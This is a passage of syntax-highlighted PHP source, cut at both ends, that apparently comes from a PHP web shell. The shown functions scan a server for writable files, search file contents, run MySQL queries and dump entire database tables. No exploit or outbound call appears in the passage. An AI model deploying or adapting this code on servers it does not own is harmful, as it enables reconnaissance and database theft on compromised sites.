<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">GetWFileList(</span>$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">elseif</span>($<span style="color: #ffeead;">file</span>!=<span style="color: #99ffff;">'.'</span> &amp;&amp; $<span style="color: #ffeead;">file</span>!=<span style="color: #99ffff;">'..'</span> &amp;&amp; <span style="color: #ffffff; background-color: #002451;">is_file(</span>$<span style="color: #ffeead;">f</span>) &amp;&amp; <span style="color: #ffffff; background-color: #002451;">in_array(</span>$<span style="color: #ffeead;">ext</span>, <span style="color: #ffffff; background-color: #002451; text-decoration: underline;">explode(</span><span style="color: #99ffff; text-decoration: underline;">','</span><span style="text-decoration: underline;">, $</span><span style="color: #ffeead; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">))){</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ffffff; background-color: #002451;">is_writable(</span>$<span style="color: #ffeead;">f</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'filename'</span>]=<span style="color: #ffffff; background-color: #002451;">str_replace(</span>$<span style="color: #ffeead;">nowpath</span>,<span style="color: #99ffff;">''</span>,$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'size'</span>]=<span style="color: #ffffff; background-color: #002451;">sizecount(</span>@<span style="color: #ffffff; background-color: #002451;">filesize(</span>$<span style="color: #ffeead;">f</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'mtime'</span>]=<span style="color: #d1f1a9;">@date</span>(<span style="color: #99ffff;">'Y-m-d H:i:s'</span>,<span style="color: #ffffff; background-color: #002451;">filemtime(</span>$<span style="color: #ffeead;">f</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'filechmod'</span>]=<span style="color: #ffffff; background-color: #002451;">getChmod(</span>$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'fileperm'</span>]=<span style="color: #ffffff; background-color: #002451;">getPerms(</span>$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'fileowner'</span>]=<span style="color: #ffffff; background-color: #002451;">getUser(</span>$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'dirlink'</span>]=$<span style="color: #ffeead;">dir</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'server_link'</span>]=$<span style="color: #ffeead;">f</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">j</span>++;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">closedir(</span>$<span style="color: #ffeead;">dh</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">clearstatcache(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">filedata</span>;
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   }
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">GetSFileList</span>($<span style="color: #ffeead;">dir</span>, $<span style="color: #ffeead;">content</span>, $<span style="color: #ffeead;">re</span> = <span style="color: #ffffff; background-color: #002451;">0</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">global</span> $<span style="color: #ffeead;">filedata</span>,$<span style="color: #ffeead;">j</span>,$<span style="color: #ffeead;">nowpath</span>, $<span style="color: #ffeead;">writabledb</span>;
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">j</span> &amp;&amp; $<span style="color: #ffeead;">j</span>=<span style="color: #ffffff; background-color: #002451;">1</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">dh</span> = <span style="color: #ffffff; background-color: #002451;">opendir(</span>$<span style="color: #ffeead;">dir</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span> ($<span style="color: #ffeead;">file</span> = <span style="color: #ffffff; background-color: #002451;">readdir(</span>$<span style="color: #ffeead;">dh</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">ext</span> = <span style="color: #ffffff; background-color: #002451;">getext(</span>$<span style="color: #ffeead;">file</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">f</span>=<span style="color: #ffffff; background-color: #002451;">str_replace(</span><span style="color: #99ffff;">'//'</span>,<span style="color: #99ffff;">'/'</span>,$<span style="color: #ffeead;">dir</span>.<span style="color: #99ffff;">'/'</span>.$<span style="color: #ffeead;">file</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">file</span>!=<span style="color: #99ffff;">'.'</span> &amp;&amp; $<span style="color: #ffeead;">file</span>!=<span style="color: #99ffff;">'..'</span> &amp;&amp; <span style="color: #ffffff; background-color: #002451;">is_dir(</span>$<span style="color: #ffeead;">f</span>)){
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">GetSFileList(</span>$<span style="color: #ffeead;">f</span>, $<span style="color: #ffeead;">content</span>, $<span style="color: #ffeead;">re</span> = <span style="color: #ffffff; background-color: #002451;">0</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">elseif</span>($<span style="color: #ffeead;">file</span>!=<span style="color: #99ffff;">'.'</span> &amp;&amp; $<span style="color: #ffeead;">file</span>!=<span style="color: #99ffff;">'..'</span> &amp;&amp; <span style="color: #ffffff; background-color: #002451;">is_file(</span>$<span style="color: #ffeead;">f</span>) &amp;&amp; <span style="color: #ffffff; background-color: #002451;">in_array(</span>$<span style="color: #ffeead;">ext</span>, <span style="color: #ffffff; background-color: #002451; text-decoration: underline;">explode(</span><span style="color: #99ffff; text-decoration: underline;">','</span><span style="text-decoration: underline;">, $</span><span style="color: #ffeead; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">))){</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">find</span> = <span style="color: #ffffff; background-color: #002451;">0</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">re</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ( <span style="color: #ffffff; background-color: #002451;">preg_match(</span><span style="color: #99ffff;">'@'</span>.$<span style="color: #ffeead;">content</span>.<span style="color: #99ffff;">'@'</span>,$<span style="color: #ffeead;">file</span>) || <span style="color: #ffffff; background-color: #002451;">preg_match(</span><span style="color: #99ffff;">'@'</span>.$<span style="color: #ffeead;">c</span><span style="color: #ffeead; text-decoration: underline;">ontent</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'@'</span><span style="text-decoration: underline;">, @</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">file_get_contents(</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">f</span><span style="text-decoration: underline;">)) ){</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">find</span> = <span style="color: #ffffff; background-color: #002451;">1</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ( <span style="color: #ffffff; background-color: #002451;">strstr(</span>$<span style="color: #ffeead;">file</span>, $<span style="color: #ffeead;">content</span>) || <span style="color: #ffffff; background-color: #002451;">strstr(</span> @<span style="color: #ffffff; background-color: #002451;">file_get_contents(</span>$<span style="color: #ffeead; text-decoration: underline;">f</span><span style="text-decoration: underline;">),$</span><span style="color: #ffeead; text-decoration: underline;">content</span><span style="text-decoration: underline;"> ) ) {</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">find</span> = <span style="color: #ffffff; background-color: #002451;">1</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">find</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'filename'</span>]=<span style="color: #ffffff; background-color: #002451;">str_replace(</span>$<span style="color: #ffeead;">nowpath</span>,<span style="color: #99ffff;">''</span>,$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'size'</span>]=<span style="color: #ffffff; background-color: #002451;">sizecount(</span>@<span style="color: #ffffff; background-color: #002451;">filesize(</span>$<span style="color: #ffeead;">f</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'mtime'</span>]=<span style="color: #d1f1a9;">@date</span>(<span style="color: #99ffff;">'Y-m-d H:i:s'</span>,<span style="color: #ffffff; background-color: #002451;">filemtime(</span>$<span style="color: #ffeead;">f</span>));
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'filechmod'</span>]=<span style="color: #ffffff; background-color: #002451;">getChmod(</span>$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'fileperm'</span>]=<span style="color: #ffffff; background-color: #002451;">getPerms(</span>$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'fileowner'</span>]=<span style="color: #ffffff; background-color: #002451;">getUser(</span>$<span style="color: #ffeead;">f</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'dirlink'</span>]=$<span style="color: #ffeead;">dir</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>[$<span style="color: #ffeead;">j</span>][<span style="color: #99ffff;">'server_link'</span>]=$<span style="color: #ffeead;">f</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">j</span>++;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">closedir(</span>$<span style="color: #ffeead;">dh</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">clearstatcache(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> $<span style="color: #ffeead;">filedata</span>;
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   }
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">qy</span>($<span style="color: #ffeead;">sql</span>) {<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">global</span> $<span style="color: #ffeead;">mysqllink</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">echo $sql.'&lt;br&gt;';</span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">res</span> = $<span style="color: #ffeead;">error</span> = <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(!$<span style="color: #ffeead;">res</span> = @<span style="color: #ffffff; background-color: #002451;">mysql_query(</span>$<span style="color: #ffeead;">sql</span>,$<span style="color: #ffeead;">mysqllink</span>)) {<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #ffffff; background-color: #002451;">0</span>;
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> <span style="color: #d1f1a9;">if</span>(<span style="color: #ffffff; background-color: #002451;">is_resource(</span>$<span style="color: #ffeead;">res</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #ffffff; background-color: #002451;">1</span>;<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #ffffff; background-color: #002451;">2</span>;
<span style="background-color: #003f8e;"> </span>   }<span style="color: #ff9da4; background-color: #003f8e;">   </span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #ffffff; background-color: #002451;">0</span>;
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">q</span>($<span style="color: #ffeead;">sql</span>) {<span style="color: #ff9da4; background-color: #003f8e;"> </span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">global</span> $<span style="color: #ffeead;">mysqllink</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> @<span style="color: #ffffff; background-color: #002451;">mysql_query(</span>$<span style="color: #ffeead;">sql</span>,$<span style="color: #ffeead;">mysqllink</span>);
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">fr</span>($<span style="color: #ffeead;">qy</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">mysql_free_result(</span>$<span style="color: #ffeead;">qy</span>);
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">sizecount</span>($<span style="color: #ffeead;">fileSize</span>) {
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">size</span> = <span style="color: #ffffff; background-color: #002451;">sprintf(</span><span style="color: #99ffff;">"%u"</span>, $<span style="color: #ffeead;">fileSize</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>($<span style="color: #ffeead;">size</span> == <span style="color: #ffffff; background-color: #002451;">0</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #99ffff;">'0 Bytes'</span> ;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">sizename</span> = <span style="color: #ffffff; background-color: #002451;">array(</span><span style="color: #99ffff;">' Bytes'</span>, <span style="color: #99ffff;">' KB'</span>, <span style="color: #99ffff;">' MB'</span>, <span style="color: #99ffff;">' GB'</span>, <span style="color: #99ffff;">' TB'</span>, <span style="color: #99ffff;">' PB'</span>, <span style="color: #99ffff;">' EB'</span>, <span style="color: #99ffff;">' ZB'</span>,<span style="text-decoration: underline;"> </span><span style="color: #99ffff; text-decoration: underline;">' YB'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span> <span style="color: #ffffff; background-color: #002451;">round(</span> $<span style="color: #ffeead;">size</span> / <span style="color: #ffffff; background-color: #002451;">pow(1024</span>, ($<span style="color: #ffeead;">i</span> = <span style="color: #ffffff; background-color: #002451;">floor(log(</span>$<span style="color: #ffeead;">size</span>, <span style="color: #ffffff; background-color: #002451;">1024</span>)))), <span style="color: #ffffff; background-color: #002451;">2</span>) . $<span style="color: #ffeead;">sizen</span><span style="color: #ffeead; text-decoration: underline;">ame</span><span style="text-decoration: underline;">[$</span><span style="color: #ffeead; text-decoration: underline;">i</span><span style="text-decoration: underline;">];</span>
}
<span style="color: #7285b7; font-style: italic;">// </span><span style="color: #7285b7; font-style: italic;">&#22791;&#20221;&#25968;&#25454;&#24211;</span>
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">sqldumptable</span>($<span style="color: #ffeead;">table</span>, $<span style="color: #ffeead;">fp</span>=<span style="color: #ffffff; background-color: #002451;">0</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">global</span> $<span style="color: #ffeead;">mysqllink</span>;

<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">tabledump</span> = <span style="color: #99ffff;">"DROP TABLE IF EXISTS `$table`;\n"</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">res</span> = <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"SHOW CREATE TABLE $table"</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">create</span> = <span style="color: #ffffff; background-color: #002451;">mysql_fetch_row(</span>$<span style="color: #ffeead;">res</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">tabledump</span> .= $<span style="color: #ffeead;">create</span>[<span style="color: #ffffff; background-color: #002451;">1</span>].<span style="color: #99ffff;">";\n\n"</span>;

<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">fp</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">fwrite(</span>$<span style="color: #ffeead;">fp</span>,$<span style="color: #ffeead;">tabledump</span>);
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> $<span style="color: #ffeead;">tabledump</span>;
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">tabledump</span> = <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">rows</span> = <span style="color: #ffffff; background-color: #002451;">q(</span><span style="color: #99ffff;">"SELECT * FROM $table"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">while</span> ($<span style="color: #ffeead;">row</span> = <span style="color: #ffffff; background-color: #002451;">mysql_fetch_assoc(</span>$<span style="color: #ffeead;">rows</span>)) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span>($<span style="color: #ffeead;">row</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">k</span>=&gt;$<span style="color: #ffeead;">v</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">row</span>[$<span style="color: #ffeead;">k</span>] = <span style="color: #99ffff;">"'"</span>.@<span style="color: #ffffff; background-color: #002451;">mysql_real_escape_string(</span>$<span style="color: #ffeead;">v</span>).<span style="color: #99ffff;">"'"</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">tabledump</span> = <span style="color: #99ffff;">'INSERT INTO `'</span>.$<span style="color: #ffeead;">table</span>.<span style="color: #99ffff;">'` VALUES ('</span>.<span style="color: #ffffff; background-color: #002451;">implode(</span><span style="color: #99ffff;">", "</span>, $<span style="color: #ffeead;">row</span>).<span style="color: #99ffff;">');</span><span style="color: #99ffff; text-decoration: underline;">'</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">"\n"</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">fp</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">fwrite(</span>$<span style="color: #ffeead;">fp</span>,$<span style="color: #ffeead;">tabledump</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">else</span> {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> $<span style="color: #ffeead;">tabledump</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">fwrite(</span>$<span style="color: #ffeead;">fp</span>,<span style="color: #99ffff;">"\n\n"</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">fr(</span>$<span style="color: #ffeead;">rows</span>);
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">p</span>($<span style="color: #ffeead;">str</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> $<span style="color: #ffeead;">str</span>.<span style="color: #99ffff;">"\n"</span>;
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">tbhead</span>() {
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;table width="100%" border="0" cellpadding="4" cellspacing="0"&gt;'</span>);
}
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">tbfoot</span>(){
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;/table&gt;'</span>);
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">makehide</span>($<span style="color: #ffeead;">name</span>,$<span style="color: #ffeead;">value</span>=<span style="color: #99ffff;">''</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">"&lt;input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" /&gt;"</span>);
}

<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">makeinput</span>($<span style="color: #ffeead;">arg</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>)){
